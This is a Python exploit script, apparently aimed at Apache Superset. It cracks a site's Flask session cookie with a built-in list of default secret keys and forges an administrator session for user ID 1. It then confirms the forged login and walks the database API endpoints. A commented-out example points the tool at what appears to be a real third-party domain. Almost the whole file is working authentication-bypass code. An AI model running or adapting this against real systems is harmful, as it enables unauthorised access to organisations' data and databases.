from flask_unsign import session
import requests
import urllib3
import argparse
import re
from time import sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',  # version >= 1.4.1
    b'thisISaSECRET_1234',  # deployment template
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',  # documentation
    b'TEST_NON_DEV_SECRET'  # docker compose
]

def main(url, user_id='1', validate=False, timeout=5):
    try:
        u = url.rstrip('/') + '/login/'

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0'
        }

        resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)
        if resp.status_code != 200:
            return None

        session_cookie = None
        for c in resp.cookies:
            if c.name == 'session':
                session_cookie = c.value
                break

        if not session_cookie:
            return None

        try:
            decoded = session.decode(session_cookie)
        except:
            return None

        match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', resp.text)
        version = match.group(1) if match else 'Unknown'

        for i, k in enumerate(SECRET_KEYS):
            cracked = session.verify(session_cookie, k)
            if cracked:
                break

        if not cracked:
            return None

        try:
            user_id = int(user_id)
        except ValueError:
            user_id = user_id

        forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k)

        if validate:
            validated = False
            try:
                headers['Cookie'] = f'session={forged_cookie}'
                sleep(timeout)
                resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)
                if resp.status_code == 302:
                    validated = True
                else:
                    return None
            except Exception as e_inner:
                return None

            if not validated:
                return None

            for i in range(1, 101):
                database_url_base = url.rstrip('/') + '/api/v1/database'
                try:
                    r = requests.get(f'{database_url_base}/{i}', headers=headers, verify=False, timeout=30,
                                     allow_redirects=False)
                    if r.status_code == 200:
                        result = r.json()['result']
                        name = result['database_name']
                    elif r.status_code == 404:
                        break
                    else:
                        break
                except Exception as e_inner:
                    break

        return forged_cookie
    except Exception as e:
        return None

def scan(target_url):
    # main(target_url)
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'
        }
        # 漏洞利用的URL路径
        vulnerable_path = "/login/"
        # 完整的URL
        vul_url = target_url + vulnerable_path
        # 构造cookies字典
        cookies = {'session': main(target_url)}
        response = requests.get(vul_url, headers=headers, cookies=cookies, timeout=10)
        # 检查响应状态码是否为200 OK
        if response.status_code == 200:
            # 检查响应内容中是否包含特定的页面标识
            if "/static/assets/6839.d677217694f24a543501.entry.js" in response.text:
                return True
        return False
    except Exception as e:
        print(f"[-] 发生错误: {e}")
        return False

# if __name__ == '__main__':
#     url = "https://bi.wxmolegames.com/"  # 替换为实际的 URL
#     cookie = main(url)
#     if cookie:
#         print(cookie)
